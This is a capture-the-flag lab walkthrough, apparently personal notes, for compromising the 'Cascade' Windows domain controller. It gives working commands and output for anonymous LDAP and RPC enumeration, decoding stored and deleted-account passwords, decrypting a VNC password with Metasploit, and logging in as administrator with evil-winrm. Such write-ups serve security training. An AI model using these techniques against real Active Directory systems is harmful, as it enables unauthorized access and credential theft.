# Nmap:
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-30 02:48:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-06-30T02:49:46
|_  start_date: 2023-06-30T02:45:58
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
```


# Using rpcclient got users and Groups:

```bash
└─$ rpcclient -U "" -N 10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]
```

# Copy to the file:

` sed -i 's/^user:\[\(.*\)\] rid:\[.*\]$/\1/' user `
     

```bash
┌──(singhx㉿kali)-[~/htb/cascade]
└─$ cat user    
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

# Enumerate using windapsearch.py:

```bash
└─$ ./windapsearch.py  -U --full --dc-ip 10.10.10.182
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.182
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=cascade,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 15 users: 

sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

# Successfully decoded the password:

```bash
└─$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva                                                                                                                                                                                                                  
```
# using eveil-winrm failed as don't have powershell permissions:

```bash
└─$ evil-winrm -u r.thompson -p rY4n5eva -i 10.10.10.182
     Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

# Tried SMBMAP got read access of the following:

```bash
└─$ smbmap -u "r.thompson" -p "rY4n5eva"  -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

# Login using the smbclient:

```bash
└─$ smbclient //10.10.10.182/Data -U r.thompson          
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 27 03:27:34 2020
  ..                                  D        0  Mon Jan 27 03:27:34 2020
  Contractors                         D        0  Mon Jan 13 01:45:11 2020
  Finance                             D        0  Mon Jan 13 01:45:06 2020
  IT                                  D        0  Tue Jan 28 18:04:51 2020
  Production                          D        0  Mon Jan 13 01:45:18 2020
  Temps                               D        0  Mon Jan 13 01:45:15 2020
```


# Tried to download the files from smb but not worked:

```bash
smb: \IT\Email Archives\> mget *
Error opening local file Meeting_Notes_June_2018.html

```
# In order to get the files tried to mount the smb shares:

```bash
└─$ sudo mkdir /mnt/cascade; mount -o user=r.thompson -t cifs //10.10.10.182/Data /mnt/cascade
```
OR 

# first make the directory in /mnt and tgen try the cmd, Successfully go the shares:

```bash
└─# cd /mnt/cascade 
                                       
┌──(root㉿kali)-[/mnt/cascade]
└─# ls
Contractors  Finance  IT  Production  Temps
```

# Got email while opening the Meeting notes:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/451ce35f-142b-47f5-ad16-0d6db995049b)

# Upon opening the VNC file in S.smith folder got vnc password:

```bash
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
```

# on opening file in AD recyclebin got the user:

```bash
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location
```

# Let's decode VNC password using metasploit: Reference

```bash
msfconsole
msf5 > irb
key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
=> "sT333ve2"
```
# Got password for .smith, Let's login with Evail-Winrm:

```bash
└─$ evil-winrm -u s.smith -p "sT333ve2" -i 10.10.10.182
SUCCESS
```

# using crackmapexec got share permissions:

```bash
└─$ crackmapexec smb -u s.smith -p sT333ve2 -d cascade.local --shares 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1          -----              -----------           ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                                   Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                                Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON  READ           Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL       READ            Logon server share 

```

# Login to smb:

```bash
└─$ smbclient //10.10.10.182/Audit$ -U s.smith
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \>recurse ON
smb: \> prompt OFF
smb: \> mask ""
smb: \> mget *

-------- Got all files---------------
```

# Got audit.db and RunAudit.bat file:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/311b34b8-b3b9-43f8-9260-5a6ea60a2d7e)

# Let's run enumeration:

```bash
└─# sqlite3 Audit.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```
OR

# sqlitebrowser Audit.db     

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/a48e820b-ed0a-47cf-b989-cd39e62e5e1e)

# Tried password cark but not works so we googled and got:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/ddb8e9a6-ace7-470e-acd2-28841fd11ac6)

# login using Evil-Winrm and run cmds:

```bash
└─$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182
PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

OR fro only users run:

PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```


# Run the cmds to extract password:

```bash
PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE)(DisplayName=TempAdmin))" -IncludeDeletedObjects -Properties *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
```

# Crack the password:

```bash
└─# echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

# let's login to the admin account using evil-winrm:

```bash
└─$ evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182

----------rooted---------------
```
